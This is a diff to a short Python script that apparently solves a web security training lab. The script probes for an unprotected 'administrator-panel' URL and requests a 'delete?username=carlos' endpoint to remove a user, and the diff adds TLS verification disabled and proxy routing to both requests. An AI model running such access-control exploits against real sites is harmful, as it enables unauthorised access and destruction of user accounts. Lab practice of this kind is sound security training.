@@ -11,14 +11,14 @@ proxies = {
 
 def find_admin_panel(url):
     admin_panel_url = url + "administrator-panel" # Here we can make usr of a wordlist that can be used to search through a wordlists and help us to get the admin panel
-    r = requests.get(admin_panel_url)
+    r = requests.get(admin_panel_url, verify=False, proxies=proxies)
     if r.status_code == 200:
         return True, admin_panel_url
     return False, '404'
 
 def delete_carlos(url):
     delete_carlos_url = url + 'delete?username=carlos'
-    r = requests.get(delete_carlos_url)
+    r = requests.get(delete_carlos_url, verify=False, proxies=proxies)
     if r.status_code == 200:
         print("Deleted the user carlos!")
     else:
